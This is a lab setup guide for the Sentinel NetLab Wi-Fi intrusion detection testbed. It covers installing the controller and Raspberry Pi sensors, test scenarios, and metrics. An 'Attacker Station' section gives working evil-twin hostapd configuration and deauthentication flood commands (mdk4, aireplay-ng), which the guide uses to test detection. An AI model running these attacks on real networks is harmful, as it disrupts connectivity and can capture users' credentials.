# Testbed Setup Guide

> Hướng dẫn thiết lập testbed cho Sentinel NetLab: 1 Controller + 2 Sensors

---

## 📐 Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     TESTBED NETWORK                         │
│                                                             │
│  ┌──────────────┐    HTTPS/TLS    ┌──────────────────────┐ │
│  │   Sensor 1   │────────────────▶│                      │ │
│  │ (Raspberry   │                 │     Controller       │ │
│  │   Pi 4)      │                 │   (VM / Docker)      │ │
│  └──────────────┘                 │                      │ │
│                                   │  - API Server        │ │
│  ┌──────────────┐                 │  - Alert Engine      │ │
│  │   Sensor 2   │────────────────▶│  - Metrics (Prom)    │ │
│  │ (Raspberry   │                 │                      │ │
│  │   Pi 4)      │                 └──────────────────────┘ │
│  └──────────────┘                                          │
│                                                             │
│  ┌──────────────┐                 ┌──────────────────────┐ │
│  │  Attacker    │                 │   Target APs         │ │
│  │  (Kali VM)   │                 │   - TP-Link          │ │
│  │  - hostapd   │                 │   - Ubiquiti         │ │
│  │  - mdk4      │                 │                      │ │
│  └──────────────┘                 └──────────────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

---

## 🖥️ Controller Setup (VM)

### Requirements
| Component | Specification |
|-----------|---------------|
| OS | Ubuntu 22.04 LTS |
| CPU | 2+ cores |
| RAM | 4GB minimum |
| Network | Static IP |

### Installation

```bash
# Clone repository
git clone https://github.com/Anduong1200/sentinel-netlab.git
cd sentinel-netlab

# Install dependencies
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Configure environment
cat > .env << 'EOF'
CONTROLLER_SECRET_KEY=$(openssl rand -hex 32)
CONTROLLER_HMAC_SECRET=$(openssl rand -hex 16)
REQUIRE_HMAC=true
MAX_TIME_DRIFT=300
EOF

# Start controller
python controller/api_server.py --host 0.0.0.0 --port 5000
```

### Docker Deployment

```bash
cd ops
docker-compose up -d
```

---

## 📡 Sensor Setup (Raspberry Pi)

### Requirements
| Component | Specification |
|-----------|---------------|
| Board | Raspberry Pi 4 (2GB+) |
| OS | Raspberry Pi OS Lite 64-bit |
| WiFi Adapter | See below |

### Recommended Adapters

| Adapter | Chipset | Monitor Mode | Notes |
|---------|---------|--------------|-------|
| Alfa AWUS036ACH | RTL8812AU | ✅ | Best 5GHz |
| Alfa AWUS036NHA | AR9271 | ✅ | Reliable 2.4GHz |
| Panda PAU09 | MT7612U | ✅ | Good range |

### Installation

```bash
# Install dependencies
sudo apt update
sudo apt install -y python3-pip python3-venv git aircrack-ng

# Clone and setup
git clone https://github.com/Anduong1200/sentinel-netlab.git
cd sentinel-netlab
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Configure sensor
cat > sensor/.env << 'EOF'
SENSOR_ID=sensor-01
CONTROLLER_URL=https://controller.local:5000
SENSOR_AUTH_TOKEN=<token-from-controller>
SENSOR_HMAC_SECRET=<shared-secret>
VERIFY_SSL=false  # Set true in production
WIFI_INTERFACE=wlan1
EOF

# Enable monitor mode
sudo airmon-ng start wlan1

# Start sensor
python sensor/main.py --interface wlan1mon
```

### Systemd Service

```bash
sudo cp ops/systemd/sentinel-sensor.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable sentinel-sensor
sudo systemctl start sentinel-sensor
```

---

## 🔴 Attacker Station (Kali)

### Evil Twin Attack

```bash
# Create hostapd config
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorpNet
channel=6
hw_mode=g
wpa=2
wpa_passphrase=evilpassword
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start evil twin
sudo airmon-ng start wlan0
sudo hostapd /tmp/evil_twin.conf
```

### Deauth Flood Attack

```bash
# Install mdk4
sudo apt install mdk4

# Run deauth attack
sudo mdk4 wlan0mon d -b /tmp/targets.txt

# Or target specific AP
sudo aireplay-ng -0 100 -a AA:BB:CC:11:22:33 wlan0mon
```

---

## 📊 Test Scenarios

### Scenario 1: Evil Twin Detection

| Step | Action | Expected | Verify |
|------|--------|----------|--------|
| 1 | Start sensors | Baseline capture | Check logs |
| 2 | Start evil twin | Duplicate SSID | - |
| 3 | Wait 30s | Alert generated | API `/alerts` |
| 4 | Check alert | Severity HIGH+ | Evidence present |

### Scenario 2: Deauth Flood Detection

| Step | Action | Expected | Verify |
|------|--------|----------|--------|
| 1 | Start sensors | Normal traffic | - |
| 2 | Run deauth flood | 50+ frames/sec | - |
| 3 | Wait 5s | Alert triggered | API `/alerts` |
| 4 | Verify | Threshold breach | Frame count |

---

## 📈 Metrics Collection

### Expected Results

| Metric | Target | Acceptable |
|--------|--------|------------|
| Detection Rate (Evil Twin) | >95% | >90% |
| Detection Rate (Deauth) | >99% | >95% |
| False Positive Rate | <5% | <10% |
| Mean Time to Detect | <30s | <60s |

### Collect Metrics

```bash
# Query controller metrics
curl http://controller:5000/metrics | grep sentinel

# Export test results
python tools/export_dataset.py \
    --input data/telemetry/*.json \
    --output data/test_results.csv \
    --labeled
```

---

## ✅ Verification Checklist

### Pre-Test
- [ ] Controller API accessible
- [ ] Both sensors registered
- [ ] Monitor mode enabled on sensors
- [ ] Attacker station ready
- [ ] Target APs powered on

### During Test
- [ ] Telemetry flowing to controller
- [ ] Prometheus metrics updating
- [ ] Logs show no errors

### Post-Test
- [ ] Alerts generated for attacks
- [ ] No false positives during baseline
- [ ] Evidence captured in alerts
- [ ] Metrics exported for analysis

---

## 🐛 Troubleshooting

| Issue | Check | Fix |
|-------|-------|-----|
| No frames captured | Monitor mode | `iw dev wlan1 info` |
| Upload fails | Network/auth | Check token, HTTPS |
| No alerts | Thresholds | Verify config |
| High CPU | Channel hopping | Reduce hop rate |

---

*Last Updated: January 28, 2026*
